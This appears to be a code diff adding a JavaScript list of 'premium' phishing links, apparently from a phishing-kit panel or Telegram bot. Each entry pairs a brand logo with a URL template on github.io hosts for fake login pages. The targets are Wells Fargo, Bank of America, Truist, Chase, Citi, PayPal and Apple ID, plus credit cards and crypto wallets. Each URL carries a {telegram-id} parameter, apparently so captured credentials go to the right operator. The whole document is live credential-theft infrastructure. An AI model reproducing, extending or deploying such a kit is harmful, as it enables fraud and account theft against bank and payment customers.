@@ -1,0 +1,15 @@
+const premiumLinks = [
+      { name: "Crypto link", image: "https://bbott52.github.io/Mobixhub/cr.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/tr.html?id={telegram-id}" },
+      { name: "USA/UK Bank", image: "https://bbott52.github.io/Mobixhub/us.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/usb.html?id={telegram-id}" },
+      { name: "USA/UK Bank and CC", image: "https://bbott52.github.io/Mobixhub/uk.png", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub?promo={telegram-id}" },
+      { name: "USA/UK CC", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub?promo={telegram-id}" },
+                         { name: "All country ATM Card or (CC) Credit or Debit card", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://ilyelya.github.io/n/ce.html?id={telegram-id}" },
+      { name: "Wells fargo login", image: "https://bbott52.github.io/Mobixhub/we.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/we.html?id={telegram-id}" },
+      { name: "BOA login", image: "https://bbott52.github.io/Mobixhub/bo.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/bo.html?id={telegram-id}" },
+      { name: "Paypal login", image: "https://bbott52.github.io/Mobixhub/pa.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/pay.html?id={telegram-id}" },
+            { name: "Truist bank login", image: "https://bbott52.github.io/Mobixhub/ttr.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/truist.html?id={telegram-id}" },
+                  { name: "apple login", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/app.html?id={telegram-id}" },
+                               { name: "JP morgan chase bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPs-HpAJwlI_H9ye7h-_yNGhSSNuCTEZClXohGW1gjmhRlmouqChS1umM&s=10", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/jb.html?id={telegram-id}" },
+                   { name: "Citi bank", image: "https://www.logo.wine/a/logo/Citibank/Citibank-Logo.wine.svg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/citi.html?id={telegram-id}" },
+                               { name: "Apple id", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/app.html?id={telegram-id}" },
+    ];
